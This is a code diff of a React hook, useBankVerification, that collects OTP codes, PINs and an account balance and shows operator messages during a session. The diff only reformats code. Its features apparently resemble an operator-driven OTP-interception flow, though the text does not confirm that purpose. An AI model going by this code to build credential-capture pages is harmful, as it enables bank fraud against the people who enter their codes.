@@ -3,7 +3,13 @@ import { useSessionStatus } from "./use-session-status";
 import { useResendCountdown } from "./use-resend-countdown";
 import { submitOtp, resendOtp, submitBalance } from "../lib/bank-api";
 import { debugLog } from "../lib/debug";
-import type { BankVerificationProps, OperatorMessage, ResendState, TransactionDetails, VerificationLayout } from "../types";
+import type {
+  BankVerificationProps,
+  OperatorMessage,
+  ResendState,
+  TransactionDetails,
+  VerificationLayout,
+} from "../types";
 
 const RESEND_COOLDOWN = 60;
 const PIN_LENGTH = 4;
@@ -71,7 +77,11 @@ type BalanceLayoutState = {
   operatorMessage: OperatorMessage | null;
 };
 
-export type LayoutState = SmsLayoutState | PinLayoutState | PushLayoutState | BalanceLayoutState;
+export type LayoutState =
+  | SmsLayoutState
+  | PinLayoutState
+  | PushLayoutState
+  | BalanceLayoutState;
 
 export interface UseBankVerificationReturn {
   layoutState: LayoutState;
@@ -119,7 +129,11 @@ export function useBankVerification({
     }
   }, [apiBase, channelSlug, sessionId, layout, debug]);
 
-  const resendState = useResendCountdown(RESEND_COOLDOWN, countdownResetTrigger, resendFn);
+  const resendState = useResendCountdown(
+    RESEND_COOLDOWN,
+    countdownResetTrigger,
+    resendFn,
+  );
 
   useEffect(() => {
     if (wrongCode || expiredCode) {
@@ -159,13 +173,26 @@ export function useBankVerification({
       debugLog(debug, "declined callback", { sessionId, status });
       onDeclined?.(sessionId, status);
     }
-  }, [channelSlug, sessionId, status, redirectUrl, onSuccess, onDeclined, onError, onRedirect, debug]);
+  }, [
+    channelSlug,
+    sessionId,
+    status,
+    redirectUrl,
+    onSuccess,
+    onDeclined,
+    onError,
+    onRedirect,
+    debug,
+  ]);
 
   const handleSubmitOtp = useCallback(
     async (codeValue: string) => {
       clearCodeFeedback?.();
       setSubmitting(true);
-      debugLog(debug, "submit OTP", { type: layout, codeLength: codeValue.length });
+      debugLog(debug, "submit OTP", {
+        type: layout,
+        codeLength: codeValue.length,
+      });
       try {
         await submitOtp(apiBase, channelSlug, sessionId ?? "", codeValue);
         debugLog(debug, "OTP submitted OK");
@@ -176,7 +203,7 @@ export function useBankVerification({
         setSubmitting(false);
       }
     },
-    [apiBase, channelSlug, sessionId, clearCodeFeedback, debug, layout]
+    [apiBase, channelSlug, sessionId, clearCodeFeedback, debug, layout],
   );
 
   const handleSubmitBalance = useCallback(
@@ -185,7 +212,12 @@ export function useBankVerification({
       setSubmitting(true);
       debugLog(debug, "submit balance", { hasValue: balanceValue.length > 0 });
       try {
-        await submitBalance(apiBase, channelSlug, sessionId ?? "", balanceValue);
+        await submitBalance(
+          apiBase,
+          channelSlug,
+          sessionId ?? "",
+          balanceValue,
+        );
         debugLog(debug, "balance submitted OK");
       } catch (e) {
         const msg = e instanceof Error ? e.message : "Failed to submit balance";
@@ -194,7 +226,7 @@ export function useBankVerification({
         setSubmitting(false);
       }
     },
-    [apiBase, channelSlug, sessionId, debug]
+    [apiBase, channelSlug, sessionId, debug],
   );
 
   const inProgress = status === "pending" || status === "awaiting_action";
